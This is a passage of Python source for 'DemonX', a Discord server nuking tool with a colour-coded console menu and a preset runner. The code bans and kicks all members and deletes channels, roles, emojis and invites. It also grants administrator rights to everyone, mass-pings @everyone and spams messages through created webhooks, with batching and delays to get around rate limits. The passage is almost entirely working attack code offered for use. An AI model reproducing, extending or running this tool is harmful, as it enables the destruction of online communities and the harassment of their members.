        print(f"{Fore.YELLOW}[*] Fetching all invites...{Style.RESET_ALL}")
        
        try:
            # Fetch invites from the guild
            invites = await guild.invites()
            
            if not invites:
                print(f"{Fore.YELLOW}[*] No invites found in this server.{Style.RESET_ALL}")
                return []
            
            # Display invites in a formatted way
            print(f"\n{Fore.CYAN}{'═'*70}")
            print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  SERVER INVITES ({len(invites)} found){Fore.CYAN}{' ' * (48 - len(str(len(invites))))}║")
            print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
            
            for i, invite in enumerate(invites, 1):
                try:
                    inviter = invite.inviter.mention if invite.inviter else "Unknown"
                    uses = f"{invite.uses}/{invite.max_uses}" if invite.max_uses else f"{invite.uses}/∞"
                    expires = invite.expires_at.strftime("%Y-%m-%d %H:%M:%S") if invite.expires_at else "Never"
                    
                    print(f"{Fore.CYAN}┌─ {Fore.GREEN}Invite #{i}{Fore.CYAN} {'─' * 60}┐")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Code: {Fore.YELLOW}{invite.code}{Fore.CYAN}{' ' * (60 - len(invite.code))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  URL: {Fore.CYAN}{invite.url}{Fore.CYAN}{' ' * (60 - min(60, len(invite.url)))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Created by: {Fore.YELLOW}{inviter}{Fore.CYAN}{' ' * (60 - len(str(inviter)))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Uses: {Fore.GREEN}{uses}{Fore.CYAN}{' ' * (60 - len(uses))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Expires: {Fore.YELLOW}{expires}{Fore.CYAN}{' ' * (60 - len(expires))}│")
                    if invite.channel:
                        print(f"{Fore.CYAN}│{Fore.WHITE}  Channel: {Fore.CYAN}#{invite.channel.name}{Fore.CYAN}{' ' * (60 - len(invite.channel.name))}│")
                    print(f"{Fore.CYAN}└{'─' * 66}┘\n")
                except Exception as e:
                    # If individual invite parsing fails, show basic info
                    print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.YELLOW}{invite.code}: {invite.url}{Fore.CYAN}{' ' * (60 - len(invite.code) - len(invite.url))}│")
            
            print(f"{Fore.GREEN}[+] Successfully fetched {len(invites)} invite(s){Style.RESET_ALL}\n")
            return invites
            
        except discord.Forbidden:
            print(f"{Fore.RED}[!] Error: Missing 'Manage Server' permission to view invites{Style.RESET_ALL}")
            return []
        except discord.HTTPException as e:
            print(f"{Fore.RED}[!] HTTP Error: {e}{Style.RESET_ALL}")
            logger.error(f"Error fetching invites: {e}", exc_info=True)
            return []
        except Exception as e:
            print(f"{Fore.RED}[!] Error fetching invites: {e}{Style.RESET_ALL}")
            logger.error(f"Error fetching invites: {e}", exc_info=True)
            return []
    
    async def webhook_spam(self, guild: discord.Guild, message: str = "Nuked", count: int = 10):
        """Create webhooks and spam (optimized)"""
        print(f"{Fore.YELLOW}[*] Creating webhooks and spamming...")
        
        text_channels = guild.text_channels
        if not text_channels:
            print(f"{Fore.YELLOW}[*] No text channels found{Style.RESET_ALL}")
            return
        
        tasks = []
        payload = {"content": message}
        for channel in text_channels:
            async def spam_webhook(ch):
                try:
                    webhook = await self.safe_execute(
                        ch.create_webhook(name="DemonX"),
                        endpoint=f"channels/{ch.id}/webhooks",
                        operation_type=OperationType.WEBHOOK_SPAM
                    )
                    if webhook:
                        webhook_url = webhook.url
                        async with aiohttp.ClientSession() as session:
                            for _ in range(count):
                                async with session.post(webhook_url, json=payload) as resp:
                                    if resp.status == 200:
                                        self.stats['messages_sent'] += 1
                                    await asyncio.sleep(0.05)  # Reduced delay
                except:
                    pass
            
            tasks.append(spam_webhook(channel))
        
        # Process in batches
        batch_size = 5  # Smaller batch for webhooks
        for i in range(0, len(tasks), batch_size):
            await asyncio.gather(*tasks[i:i + batch_size], return_exceptions=True)
            if i + batch_size < len(tasks):
                await asyncio.sleep(0.2)
        
        print(f"{Fore.GREEN}[+] Sent {self.stats['messages_sent']} webhook messages")
    
    async def auto_react_messages(self, guild: discord.Guild, emoji: str = "💀", limit: int = 100):
        """Auto react to messages"""
        print(f"{Fore.YELLOW}[*] Reacting to messages...")
        tasks = []
        for channel in guild.text_channels:
            async def react_channel(ch):
                try:
                    async for message in ch.history(limit=limit):
                        result = await self.safe_execute(
                            message.add_reaction(emoji),
                            endpoint=f"channels/{ch.id}/messages/{message.id}/reactions/{emoji}",
                            operation_type=OperationType.REACT_MESSAGE
                        )
                        if result is not False:
                            await asyncio.sleep(0.1)
                except:
                    pass
            
            tasks.append(react_channel(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Reacted to messages")
    
    async def react_to_pinned_messages(self, guild: discord.Guild, emoji: str = "💀"):
        """React to pinned messages"""
        print(f"{Fore.YELLOW}[*] Reacting to pinned messages...")
        tasks = []
        for channel in guild.text_channels:
            async def react_pinned(ch):
                try:
                    pins = await ch.pins()
                    for message in pins:
                        await self.safe_execute(
                            message.add_reaction(emoji),
                            endpoint=f"channels/{ch.id}/messages/{message.id}/reactions/{emoji}",
                            operation_type=OperationType.REACT_MESSAGE
                        )
                except:
                    pass
            
            tasks.append(react_pinned(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Reacted to pinned messages")
    
    # ==================== EMOJI MANAGEMENT ====================
    
    async def delete_emojis(self, guild: discord.Guild):
        """Delete all emojis"""
        print(f"{Fore.YELLOW}[*] Deleting all emojis...")
        tasks = []
        for emoji in guild.emojis:
            async def delete_emoji(e):
                result = await self.safe_execute(
                    e.delete(),
                    endpoint=f"guilds/{guild.id}/emojis/{e.id}",
                    operation_type=OperationType.DELETE_EMOJI
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Deleted emoji {e.name}")
            
            tasks.append(delete_emoji(emoji))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Deleted {len(guild.emojis)} emojis")
    
    # ==================== ADVANCED FEATURES ====================
    
    async def execute_preset(self, guild: discord.Guild, preset_name: str):
        """Execute a preset"""
        preset = self.preset_manager.get_preset(preset_name)
        if not preset:
            print(f"{Fore.RED}[!] Preset '{preset_name}' not found")
            return
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Executing Preset: {preset_name}{Fore.CYAN}{' ' * (45 - len(preset_name))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        for i, operation in enumerate(preset, 1):
            op_type = operation.get('type')
            params = operation.get('params', {})
            
            print(f"{Fore.CYAN}[{i}/{len(preset)}] {Fore.YELLOW}Executing: {op_type}{Style.RESET_ALL}")
            
            # Map operation types to methods
            operations_map = {
                'ban_all': lambda g: self.ban_all_members(g),
                'kick_all': lambda g: self.kick_all_members(g),
                'delete_channels': lambda g: self.delete_channels(g),
                'create_channels': lambda g: self.create_channels(g, params.get('count', 50), params.get('name')),
                'delete_roles': lambda g: self.delete_roles(g),
                'create_roles': lambda g: self.create_roles(g, params.get('count', 50), params.get('name')),
                'delete_emojis': lambda g: self.delete_emojis(g),
                'mass_ping': lambda g: self.mass_ping(g, params.get('message', '@everyone Nuked'), params.get('count', 5)),
                'rename_channels': lambda g: self.rename_channels(g, params.get('name')),
                'rename_roles': lambda g: self.rename_roles(g, params.get('name')),
                'rename_guild': lambda g: self.rename_guild(g, params.get('name')),
                'mass_nickname': lambda g: self.mass_nickname(g, params.get('nickname')),
                'grant_admin': lambda g: self.grant_admin_all(g),
                'shuffle_channels': lambda g: self.shuffle_channels(g),
                'unban_all': lambda g: self.unban_all_members(g),
                'prune': lambda g: self.prune_members(g, params.get('days', 7)),
                'create_categories': lambda g: self.create_categories(g, params.get('count', 10), params.get('name')),
                'delete_categories': lambda g: self.delete_categories(g),
                'webhook_spam': lambda g: self.webhook_spam(g, params.get('message', 'Nuked'), params.get('count', 10)),
                'auto_react': lambda g: self.auto_react_messages(g, params.get('emoji', '💀'), params.get('limit', 100)),
            }
            
            if op_type in operations_map:
                try:
                    await operations_map[op_type](guild)
                    print(f"{Fore.GREEN}[+] Completed: {op_type}{Style.RESET_ALL}\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error executing {op_type}: {e}{Style.RESET_ALL}\n")
                    logger.error(f"Error executing preset operation {op_type}: {e}")
            else:
                print(f"{Fore.RED}[!] Unknown operation type: {op_type}{Style.RESET_ALL}\n")
            
            await asyncio.sleep(1)  # Delay between operations
        
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Preset Execution Complete{Fore.CYAN}{' ' * 38}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    def print_statistics(self):
        """Print professional statistics dashboard"""
        elapsed = time.time() - self.stats.get('start_time', time.time())
        history_stats = self.operation_history.get_statistics()
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  DEMONX STATISTICS DASHBOARD{Fore.CYAN}{' ' * 38}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}OPERATION STATISTICS{Fore.CYAN} {'─' * 45}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Banned Members:{Fore.CYAN}{' ' * 47}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['banned']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['banned'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Kicked Members:{Fore.CYAN}{' ' * 47}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['kicked']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['kicked'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Channels Created:{Fore.CYAN}{' ' * 45}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['channels_created']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['channels_created'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Channels Deleted:{Fore.CYAN}{' ' * 45}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['channels_deleted']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['channels_deleted'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Roles Created:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['roles_created']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['roles_created'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Roles Deleted:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['roles_deleted']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['roles_deleted'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Messages Sent:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['messages_sent']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['messages_sent'])))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.RED}{Style.BRIGHT}ERROR STATISTICS{Fore.CYAN} {'─' * 49}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.RED}✗ Errors:{Fore.CYAN}{' ' * 55}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['errors']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['errors'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.RED}⚠ Rate Limits:{Fore.CYAN}{' ' * 50}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats.get('rate_limits', 0)}{Fore.CYAN}{' ' * (60 - len(str(self.stats.get('rate_limits', 0))))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.BLUE}{Style.BRIGHT}SYSTEM INFORMATION{Fore.CYAN} {'─' * 46}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.BLUE}⏱ Uptime:{Fore.CYAN}{' ' * 54}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {elapsed:.2f} seconds{Fore.CYAN}{' ' * (60 - len(f'{elapsed:.2f} seconds'))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def validate_permissions(self, guild: discord.Guild) -> bool:
        """Validate bot permissions"""
        if not guild.me.guild_permissions.administrator:
            print(f"{Fore.RED}[!] Bot needs administrator permissions!")
            return False
        return True
    
    async def run_menu(self, guild: discord.Guild):
        """Run interactive menu in background (non-blocking)"""
        while True:
            try:
                # Clear screen and show menu
                os.system('cls' if os.name == 'nt' else 'clear')
                
                # Print banner
                print_banner()
                
                # Menu options in 5 columns - Sequential order
                # Format: [XX] TEXT with proper spacing
                menu_data = [
                    [("[01]", "BAN MEMBERS"), ("[02]", "DELETE CHANNELS"), ("[03]", "KICK MEMBERS"), ("[04]", "PRUNE"), ("[05]", "CREATE CHANNELS")],
                    [("[06]", "MASS PING"), ("[07]", "CREATE ROLES"), ("[08]", "DELETE ROLES"), ("[09]", "DELETE EMOJIS"), ("[10]", "CREATE CATEGORIES")],
                    [("[11]", "RENAME CHANNELS"), ("[12]", "RENAME ROLES"), ("[13]", "SHUFFLE CHANNELS"), ("[14]", "UNBAN ALL"), ("[15]", "UNBAN MEMBER")],
                    [("[16]", "MASS NICK"), ("[17]", "GRANT ADMIN"), ("[18]", "CHECK UPDATE"), ("[19]", "CREDIT"), ("[20]", "EXIT")],
                    [("[21]", "COPY ROLE PERMS"), ("[22]", "RENAME GUILD"), ("[23]", "MODIFY VERIFY"), ("[24]", "CHANGE AFK"), ("[25]", "DELETE INVITES")],
                    [("[26]", "CREATE INVITES"), ("[27]", "GET INVITES"), ("[28]", "WEBHOOK SPAM"), ("[29]", "AUTO REACT"), ("[30]", "REACT PINNED")],
                    [("[31]", "DELETE EMOJIS"), ("[32]", "EXECUTE PRESET"), ("[33]", "CREATE PRESET"), ("[34]", "LIST PRESETS"), ("[35]", "STATISTICS")],
                    [("[36]", "HISTORY"), ("[00]", "EXIT"), ("", ""), ("", ""), ("", "")],
                ]
                
                # Print menu in columns
                for row in menu_data:
                    line_parts = []
                    for num, text in row:
                        if num and text:
                            # Format: [XX] TEXT with spacing
                            line_parts.append(f"{Fore.MAGENTA}{num}{Fore.CYAN} {text}")
                        elif not num and not text:
                            line_parts.append(" " * 20)  # Empty space
                    if any(part.strip() for part in line_parts):
                        print("".join(f"{part:<22}" for part in line_parts))
                
                # Warning message
                print(f"\n{Fore.MAGENTA}!! NUKERS ARE BREAKING THE SYSTEM FOR PROFIT !!{Style.RESET_ALL}\n")
                
                # Get current time for timestamp
                current_time = time.strftime("%H:%M:%S")
                
                # Input prompt
                print(f"{Fore.WHITE}{current_time}")
                print(f"{Fore.RED}INP{Style.RESET_ALL} {Fore.WHITE}•{Style.RESET_ALL} {Fore.RED}OPTION{Style.RESET_ALL}")
                
                # Use asyncio.to_thread for non-blocking input
                choice = await asyncio.to_thread(input, f"{Fore.WHITE}>{Style.RESET_ALL} ")
                choice = choice.strip()
                
                try:
                    if choice == "1":
                        await self.ban_all_members(guild)
                    elif choice == "2":
                        await self.delete_channels(guild)
                    elif choice == "3":
                        await self.kick_all_members(guild)
                    elif choice == "4":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}PRUNE MEMBERS{Fore.CYAN} {'─' * 53}┐")
                        print(f"{Fore.CYAN}│{Fore.WHITE}  Enter days of inactivity to prune{Fore.CYAN}{' ' * 33}│")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        days_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Days{Fore.CYAN} (default: 7): {Style.RESET_ALL}")
                        days = int(days_input.strip() or "7")
                        await self.prune_members(guild, days)
                    elif choice == "5":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}CREATE CHANNELS{Fore.CYAN} {'─' * 52}┐")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Count{Fore.CYAN} (default: 50): {Style.RESET_ALL}")
                        count = int(count_input.strip() or "50")
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Name{Fore.CYAN} (optional, random if empty): {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.create_channels(guild, count, name)
                    elif choice == "6":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}MASS PING{Fore.CYAN} {'─' * 57}┐")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        msg_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Message{Fore.CYAN} (default: @everyone Nuked): {Style.RESET_ALL}")
                        msg = msg_input.strip() or "@everyone Nuked"
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Count per Channel{Fore.CYAN} (default: 5): {Style.RESET_ALL}")
                        count = int(count_input.strip() or "5")
                        await self.mass_ping(guild, msg, count)
                    elif choice == "7":
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Count: {Style.RESET_ALL}")
                        count = int(count_input.strip() or "50")
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Name (optional): {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.create_roles(guild, count, name)
                    elif choice == "8":
                        await self.delete_roles(guild)
                    elif choice == "9":
                        await self.delete_emojis(guild)
                    elif choice == "10":
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Count: {Style.RESET_ALL}")
                        count = int(count_input.strip() or "10")
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Name (optional): {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.create_categories(guild, count, name)
                    elif choice == "11":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}RENAME CHANNELS{Fore.CYAN} {'─' * 51}┐")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}New Name{Fore.CYAN} (optional, random if empty): {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.rename_channels(guild, name)
                    elif choice == "12":
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] New name: {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.rename_roles(guild, name)
                    elif choice == "13":
                        await self.shuffle_channels(guild)
                    elif choice == "14":
                        await self.unban_all_members(guild)
                    elif choice == "15":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}UNBAN MEMBER{Fore.CYAN} {'─' * 54}┐")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        user_id_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}User ID{Fore.CYAN}: {Style.RESET_ALL}")
                        user_id = int(user_id_input.strip())
                        await self.unban_member(guild, user_id)
                    elif choice == "16":
                        print(f"{Fore.CYAN}┌─ {Fore.YELLOW}{Style.BRIGHT}MASS NICKNAME{Fore.CYAN} {'─' * 52}┐")
                        print(f"{Fore.CYAN}│{Fore.WHITE}  Enter nickname (leave empty for random){Fore.CYAN}{' ' * 28}│")
                        print(f"{Fore.CYAN}└{'─' * 68}┘")
                        nick = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Nickname{Fore.CYAN}: {Style.RESET_ALL}")
                        await self.mass_nickname(guild, nick.strip() or None)
                    elif choice == "17":
                        await self.grant_admin_all(guild)
                    elif choice == "18":
                        # Check Update
                        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.MAGENTA}║{Fore.WHITE}  DEMONX - Version Check{Fore.MAGENTA}{' ' * 42}║")
                        print(f"{Fore.MAGENTA}║{Fore.CYAN}  Current Version: v2.0{Fore.MAGENTA}{' ' * 42}║")
                        print(f"{Fore.MAGENTA}║{Fore.CYAN}  Author: Kirito / Demon{Fore.MAGENTA}{' ' * 40}║")
                        print(f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "19":
                        # Credit
                        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.MAGENTA}║{Fore.WHITE}  DEMONX - Credits{Fore.MAGENTA}{' ' * 48}║")
                        print(f"{Fore.MAGENTA}║{Fore.CYAN}  Author: Kirito / Demon{Fore.MAGENTA}{' ' * 40}║")
                        print(f"{Fore.MAGENTA}║{Fore.CYAN}  Version: v2.0 - Complete Professional Edition{Fore.MAGENTA}{' ' * 19}║")
                        print(f"{Fore.MAGENTA}║{Fore.CYAN}  Built with discord.py & aiohttp{Fore.MAGENTA}{' ' * 35}║")
                        print(f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "20":
                        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.MAGENTA}║{Fore.WHITE}  [*] Shutting Down...{Fore.MAGENTA}{' ' * 45}║")
                        print(f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await self.bot.close()
                        break
                    elif choice == "21":
                        source_id_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Source Role ID: {Style.RESET_ALL}")
                        source_id = int(source_id_input.strip())
                        target_id_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Target Role ID: {Style.RESET_ALL}")
                        target_id = int(target_id_input.strip())
                        source = guild.get_role(source_id)
                        target = guild.get_role(target_id)
                        if source and target:
                            await self.copy_role_permissions(guild, source, target)
                        else:
                            print(f"{Fore.RED}[!] Role not found!")
                    elif choice == "22":
                        name_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] New name: {Style.RESET_ALL}")
                        name = name_input.strip() or None
                        await self.rename_guild(guild, name)
                    elif choice == "23":
                        level_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Level (0-4): {Style.RESET_ALL}")
                        level = int(level_input.strip() or "0")
                        await self.modify_verification_level(guild, discord.VerificationLevel(level))
                    elif choice == "24":
                        timeout_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Timeout (seconds): {Style.RESET_ALL}")
                        timeout = int(timeout_input.strip() or "300")
                        await self.change_afk_timeout(guild, timeout)
                    elif choice == "25":
                        await self.delete_all_invites(guild)
                    elif choice == "26":
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Count: {Style.RESET_ALL}")
                        count = int(count_input.strip() or "10")
                        await self.create_invites(guild, count)
                    elif choice == "27":
                        os.system('cls' if os.name == 'nt' else 'clear')
                        await self.get_all_invites(guild)
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "28":
                        msg_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Message: {Style.RESET_ALL}")
                        msg = msg_input.strip() or "Nuked"
                        count_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Count per webhook: {Style.RESET_ALL}")
                        count = int(count_input.strip() or "10")
                        await self.webhook_spam(guild, msg, count)
                    elif choice == "29":
                        emoji_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Emoji: {Style.RESET_ALL}")
                        emoji = emoji_input.strip() or "💀"
                        limit_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Messages per channel: {Style.RESET_ALL}")
                        limit = int(limit_input.strip() or "100")
                        await self.auto_react_messages(guild, emoji, limit)
                    elif choice == "30":
                        emoji_input = await asyncio.to_thread(input, f"{Fore.CYAN}[?] Emoji: {Style.RESET_ALL}")
                        emoji = emoji_input.strip() or "💀"
                        await self.react_to_pinned_messages(guild, emoji)
                    elif choice == "31":
                        await self.delete_emojis(guild)
                    elif choice == "32":
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  EXECUTE PRESET{Fore.CYAN}{' ' * 54}║")
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        presets = self.preset_manager.list_presets()
                        if presets:
                            print(f"{Fore.CYAN}Available Presets:{Style.RESET_ALL}")
                            for i, preset in enumerate(presets, 1):
                                print(f"{Fore.YELLOW}  {i}. {preset}{Style.RESET_ALL}")
                            print()
                        preset_name_input = await asyncio.to_thread(input, f"{Fore.CYAN}║ {Fore.YELLOW}Preset Name{Fore.CYAN}: {Style.RESET_ALL}")
                        preset_name = preset_name_input.strip()
                        if preset_name:
                            await self.execute_preset(guild, preset_name)
                        else:
                            print(f"{Fore.RED}[!] Preset name required!{Style.RESET_ALL}")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "33":
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  CREATE PRESET{Fore.CYAN}{' ' * 55}║")
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        print(f"{Fore.CYAN}To create a preset, edit presets.json manually.{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}Example format:{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}{{")
                        print(f'{Fore.YELLOW}  "my_preset": [')
                        print(f'{Fore.YELLOW}    {{"type": "ban_all", "params": {{}}}},')
                        print(f'{Fore.YELLOW}    {{"type": "delete_channels", "params": {{}}}},')
                        print(f'{Fore.YELLOW}    {{"type": "create_channels", "params": {{"count": 50}}}}')
                        print(f'{Fore.YELLOW}  ]')
                        print(f'{Fore.YELLOW}}}{Style.RESET_ALL}\n')
                        print(f"{Fore.CYAN}Available operation types:{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}  - ban_all")
                        print(f"  - kick_all")
                        print(f"  - delete_channels")
                        print(f"  - create_channels")
                        print(f"  - delete_roles")
                        print(f"  - create_roles")
                        print(f"  - mass_ping")
                        print(f"  - rename_channels")
                        print(f"  - rename_roles{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "34":
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  LIST PRESETS{Fore.CYAN}{' ' * 55}║")
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        presets = self.preset_manager.list_presets()
                        if presets:
                            print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}AVAILABLE PRESETS{Fore.CYAN} {'─' * 50}┐")
                            for i, preset in enumerate(presets, 1):
                                preset_data = self.preset_manager.get_preset(preset)
                                op_count = len(preset_data) if preset_data else 0
                                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.YELLOW}{i}. {preset}{Fore.CYAN}{' ' * (50 - len(preset))} ({op_count} operations){Fore.CYAN}{' ' * (15 - len(str(op_count)))}│")
                            print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                        else:
                            print(f"{Fore.YELLOW}[*] No presets found.{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}[*] Create presets by editing presets.json{Style.RESET_ALL}\n")
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    elif choice == "35":
                        self.print_statistics()
                    elif choice == "36":
                        stats = self.operation_history.get_statistics()
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  OPERATION HISTORY STATISTICS{Fore.CYAN}{' ' * 38}║")
                        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                        
                        if stats:
